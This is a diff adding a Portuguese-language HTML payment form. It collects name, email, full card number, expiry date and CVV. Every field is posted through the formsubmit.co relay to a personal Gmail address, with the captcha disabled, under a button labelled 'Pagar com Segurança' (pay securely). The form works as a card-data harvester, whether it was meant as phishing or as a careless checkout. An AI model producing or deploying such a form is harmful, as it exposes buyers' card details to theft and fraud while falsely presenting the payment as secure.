@@ -1,0 +1,42 @@
+<form action="https://formsubmit.co/jonasarcuri2020@gmail.com" method="POST">
+  <div class="form-group">
+    <label for="name">Nome completo</label>
+    <input type="text" id="name" name="Nome" placeholder="Seu nome completo" required>
+  </div>
+
+  <div class="form-group">
+    <label for="email">E-mail para entrega</label>
+    <input type="email" id="email" name="Email" placeholder="seuemail@exemplo.com" required>
+  </div>
+
+  <div class="form-group">
+    <label for="payment">Forma de pagamento</label>
+    <select id="payment" name="Forma de Pagamento" required>
+      <option value="">Selecione</option>
+      <option value="Cartão de Crédito">Cartão de Crédito</option>
+      <option value="PIX">PIX</option>
+      <option value="Boleto Bancário">Boleto Bancário</option>
+    </select>
+  </div>
+
+  <div class="form-group">
+    <label for="card">Número do Cartão</label>
+    <input type="text" id="card" name="Número do Cartão" placeholder="0000 0000 0000 0000">
+  </div>
+
+  <div class="form-group">
+    <label for="validade">Validade (MM/AA)</label>
+    <input type="text" id="validade" name="Validade" placeholder="MM/AA">
+  </div>
+
+  <div class="form-group">
+    <label for="cvv">CVV</label>
+    <input type="number" id="cvv" name="CVV" placeholder="123">
+  </div>
+
+  <!-- Anti-spam e redirecionamento -->
+  <input type="hidden" name="_captcha" value="false">
+  <input type="hidden" name="_next" value="https://seusite.com/obrigado.html">
+
+  <button type="submit" class="btn-pagar">Pagar com Segurança</button>
+</form>
